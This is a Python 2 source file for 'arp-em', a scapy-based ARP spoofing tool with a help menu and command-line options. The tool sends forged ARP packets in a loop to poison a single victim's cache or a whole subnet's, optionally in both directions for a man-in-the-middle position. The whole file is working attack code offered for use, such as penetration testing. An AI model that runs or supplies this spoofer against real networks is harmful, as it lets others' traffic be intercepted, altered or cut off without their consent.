#!/usr/bin/python2.7

##~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ Concept ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~##
## Filename: arp-em

## This script will allow a user to quickly and easily perform an arpspoof

## For further details, check the bottom of this file
##~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~##

import argparse, logging, os, sys
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import *

def arpPoison(gWay, target = None, opcode = 'who-has', interval = 3, verbose = 'no', direction = 'one-way', iFace = None):
    """Poison an ARP cache with your MAC Address
    Where gWay is the Gateway for the subnet, use the following as an example:
    arpcachepoison(gWay, [target = None], [opcode = 'who-has'], \
    [direction = 'one-way'], [iFace = None], [interval = 3])

    If no target is declared, then poison the whole subnet.
    If no target is declared, opcode is hardcoded for 'is-at'.
    If no target is declared, direction is hardcoded to 'one-way'.

    If target is declared, direction may be set to 'two-way'

    iFace is the interface and the recommended practice
    is to let scapy deal with it.
    """
    ## Grab our hwaddr if we are defining an interface
    if iFace:
        smac = get_if_hwaddr(iFace)

    ## Broadcast attack
    if target is None:
        p = Ether(dst = 'ff:ff:ff:ff:ff:ff')/ARP(op = 'is-at', hwdst = 'ff:ff:ff:ff:ff:ff', psrc = gWay)

    ## Targeted attack
    else:
        gmac = getmacbyip(gWay)
        tmac = getmacbyip(target)
        
        ## Let scapy decide the interface
        if not iFace:
            p = Ether(dst = tmac)/ARP(op = opcode, psrc = gWay, pdst = target)

        ## You choose the interface
        else:
            p = Ether(src = smac, dst = tmac)/ARP(op = opcode, psrc = gWay, pdst = target)

        if direction == 'two-way':

            ## Let scapy decide the interface
            if not iFace:
                p2 = Ether(dst = gmac)/ARP(op = opcode, psrc = target, pdst = gWay)

            ## You choose the interface
            else:
                p2 = Ether(src = smac, dst = gmac)/ARP(op = opcode, psrc = target, pdst = gWay)

    try:
        ## Let scapy decide the interface
        if not iFace:
            while 1:
                sendp(p, iface_hint=target)
                if verbose:
                    p.show()
                if direction == 'two-way':
                    sendp(p2, iface_hint=target)
                    if verbose:
                        p2.show()
                if conf.verb > 1:
                    os.write(1,".")
                time.sleep(interval)

        ## You choose the interface
        else:
            while 1:
                sendp(p, iface = iFace)
                if verbose:
                    p.show()
                if direction == 'two-way':
                    sendp(p2, iface = iFace)
                    if verbose:
                        p2.show()
                if conf.verb > 1:
                    os.write(1,".")
                time.sleep(interval)
    except KeyboardInterrupt:
        pass


def main(args):
    """Parse the options and run arpPoison()"""
    #arpPoison(gWay, target = None, opcode = 'who-has', direction = 'one-way', iFace = None, interval = 3)
    
    ## Deal with no gateway specified
    if args.g is None:
        print 'Gateway is required'
        sys.exit(1)
    
    ## Deal with -d and no target
    if args.d is True and args.t is None:
        print 'Two-way arpspoof requires a target'
        sys.exit(1)

    ## Deal with opcode and direction
    if args.t is None:
        opcode = 'is-at'
        direction = 'one-way'
    else:
        if not args.o:
            opcode = 'who-has'
        else:
            opcode = args.o

        ## Deal with direction
        if args.d:
            direction = 'two-way'
        else:
            direction = 'one-way'

    ## Deal with pause
    if args.p:
        interval = int(args.p)
    else:
        interval = 3
        
    ## Deal with verbosity
    if args.v:
        verbose = 1
    else:
        verbose = None

    ## Poison
    arpPoison(args.g, args.t, opcode, interval, verbose, direction, iFace = None)


def menu():
    """Help menu"""
    if len(sys.argv) > 1:
        pass
    else:
        os.system('clear') 
        print 'arp-em - the new and improved ARP spoofer'
        print ''
        print '*******************************************'
        print '**           Required  Options           **'
        print '*******************************************'
        print '  -g <Gateway>'
        print '    Targeted Gateway'
        print '*******************************************'
        print '**           Available Options           **'
        print '*******************************************'
        print '  -d <Spoof both hosts>'
        print '    Two-way arpspoof'
        print ''
        print '  -i <interface>'
        print '    Your spoof interface'
        print ''
        print '  -o <opcode>'
        print '    Set the opcode'
        print '    Target is required'
        print '    Defaults to who-has'
        print ''
        print '  -p <Pause>'
        print '    Time in seconds to pause between arps'
        print ''
        print '  -t <Target MAC>'
        print '    Targeted MAC'
        print ''
        print '  -v <Verbosity>'
        print '    Print the packet sent'
        sys.exit(0)


if __name__ == '__main__':
    parser = argparse.ArgumentParser(description = 'arp-em', usage = menu())
    parser.add_argument('-g', help = 'Choose the Gateway [Optional]')
    parser.add_argument('-d', action = 'store_true', help = '2-way attack [-t must be invoked]')
    parser.add_argument('-i', help = 'Set the interface [Optional]')
    parser.add_argument('-o', help = 'Choose the opcode [Optional]')
    parser.add_argument('-p', help = 'Choose the pause period between arps [Optional]')
    parser.add_argument('-t', help = 'Choose the victim [Optional]')
    parser.add_argument('-v', action = 'store_true', help = 'Choose to have verbosity [Optional]')
    args = parser.parse_args()
    main(args)



##~~~~~~~~~~~~~~~~~~~~~~~~~ File and License Info ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~##
## Filename: arp-em
## Version:  0.2
## Copyright (C) <2016>  <stryngs>

##  This program is free software: you can redistribute it and/or modify
##  it under the terms of the GNU General Public License as published by
##  the Free Software Foundation, either version 3 of the License, or
##  (at your option) any later version.

##  This program is distributed in the hope that it will be useful,
##  but WITHOUT ANY WARRANTY; without even the implied warranty of
##  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
##  GNU General Public License for more details.

##  You should have received a copy of the GNU General Public License
##  along with this program.  If not, see <http://www.gnu.org/licenses/>.
##~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~##


##~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ To Do ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~##
## Add exclusions
##~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~##


##~~~~~~~~~~~~~~~~~~~~~~~~~~~ Credits and Kudos ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~##
## First and foremost, to God above for giving me the abilities I have, Amen.

## The "Community" for always working towards improving the existing.....

## Kudos to my wife for always standing by my side, having faith in me, and showing the greatest of patience for my obsession with hacking.
##~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~##